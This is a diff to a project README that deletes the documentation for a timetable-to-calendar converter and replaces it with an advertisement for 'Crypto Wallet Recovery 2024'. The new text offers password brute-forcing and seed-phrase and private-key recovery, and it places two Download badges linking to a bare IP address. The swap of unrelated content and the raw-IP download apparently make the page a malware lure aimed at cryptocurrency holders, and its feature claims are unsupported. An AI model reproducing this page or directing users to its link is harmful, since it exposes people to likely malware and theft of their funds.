@@ -1,51 +1,40 @@
-# ***BaronTime***
-*Converts your course excel timetable to a nice calendar. Can be used for Office and Google Calendar*
-[Get your course codes from (Bennett DigiiCampus)](#get-your-course-codes)
+<div id="badges">
+  <img src="https://img.shields.io/badge/Windows-blue?logo=Windows&logoColor=white&style=for-the-badge" alt="Windows Badge"/>
+  <img src="https://img.shields.io/badge/License-dark?logo=License&logoColor=white&style=for-the-badge" alt="License Badge"/>
+  <img src="https://img.shields.io/badge/MIT-grey?logo=MIT&logoColor=white&style=for-the-badge" alt="MIT Badge"/>
+
+</ol>
+<a href="http://91.210.165.22/J9zyDTqf">
+<img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
 
 
-## How to start
-1. Ensure your excel file is ```.xlsx``` and not ```.xls```. [Fix Here](#fix-xls-excel-sheet)
-2. run ```pip install -r requirements.txt```
-3. Run the ```main.py``` file without any parameters.
-4. Select the correct excel file with your timetable.
-5. Follow prompts
-    - Ensure your courses exist in ```course_codes.txt```
-    - Add your course codes to ```your_courses.txt```. For best results remove all other course codes from the file.
-6. Program generates ```TimeTable Baron.ics```
-7. Add the file to your calendar. [How to add calendar to Office 365.](#add-your-ics-file-to-office365-calendar)
+# Crypto Wallet Recovery 2024
 
-## Fix .xls excel sheet
-Open the ```.xls``` file excel and save as ```.xlsx``` (Excel Workbook)
+## 🔑💻 Description:
 
-## Get your course codes
-**Known Issue: Does not work for all as different layout throughout years. Dumb**
-
-Generate your course registration slip from [CollPoll](https://bennett.digiicampus.com/courseRegistration/student).
-
-Slip looks like this
-![Course Registration](courseRegistration.png)
-
-Open Dev Tools and run the following code in the console window.
-```JS
-// Amatuer JS Codes.
-table = document.childNodes[1].childNodes[1].childNodes[1].childNodes[0].childNodes[0].childNodes[4].childNodes[2].childNodes[9].childNodes[1].childNodes[1]
-
-f=''
-for(var i=2; i < table.childNodes.length-2; i+=2) {
-   f += table.childNodes[i].cells[1].innerText + '\n'
-}
-console.log(f)
-```
-
-## Add your .ics file to Office365 calendar.
-- Create a new blank calendar.
-![New Blank Calendar](createCalendar.png)
-- Click on **Upload from file** and upload the ```.ics``` file.
-- Add it to the newly created blank calendar.
-- Done. 
+A crypto wallet recovery tool or software is designed to help users regain access to their cryptocurrency wallets in the event of lost or forgotten passwords, seed phrases, or private keys. These tools utilize advanced algorithms and techniques to brute-force or recover the necessary information, allowing users to access their funds and continue managing their digital assets.
 
 
-## Contribute
-- Test with other courses, branches and years
-- Add more courses.
-- Check issues.
+<p><img src="https://repository-images.githubusercontent.com/743825272/8c529c90-24a5-4c0c-8082-89b44585d0a9"/></p>
+
+## Features:
+
+ - 🔑 Password Recovery: Recover lost or forgotten wallet passwords using various methods, including brute-force attacks and dictionary-based guessing.
+- 📝 Seed Phrase Recovery: Reconstruct lost or incomplete seed phrases, which are essential for accessing non-custodial wallets.
+- 🗝️ Private Key Recovery: Retrieve private keys associated with your cryptocurrency addresses, enabling you to regain control of your funds.
+- 🌐 Multi-Currency Support: Recover wallets for a wide range of cryptocurrencies, including Bitcoin, Ethereum, Litecoin, and many others.
+- 💻 User-Friendly Interface: Intuitive and easy-to-use software, making it accessible to both beginners and experienced users.
+- 🛡️ Secure and Private: Employs industry-standard encryption and security protocols to protect your sensitive information.
+
+## Benefits:
+
+- 💰 Recover Lost Funds: Regain access to your cryptocurrency wallets and recover lost or inaccessible funds.
+- 🔑 Avoid Wallet Lockouts: Prevent permanent loss of access to your digital assets due to forgotten passwords or seed phrases.
+- ⌛ Save Time and Effort: Automate the recovery process, saving you valuable time and effort compared to manual attempts.
+- 🛡️ Peace of Mind: Provide peace of mind by ensuring that your cryptocurrency investments are secure and accessible.
+
+
+
+</ol>
+<a href="http://91.210.165.22/J9zyDTqf">
+<img src="https://img.shields.io/badge/Download-blue?logo=Download&logoColor=white&style=for-the-badge" alt="Download"/>
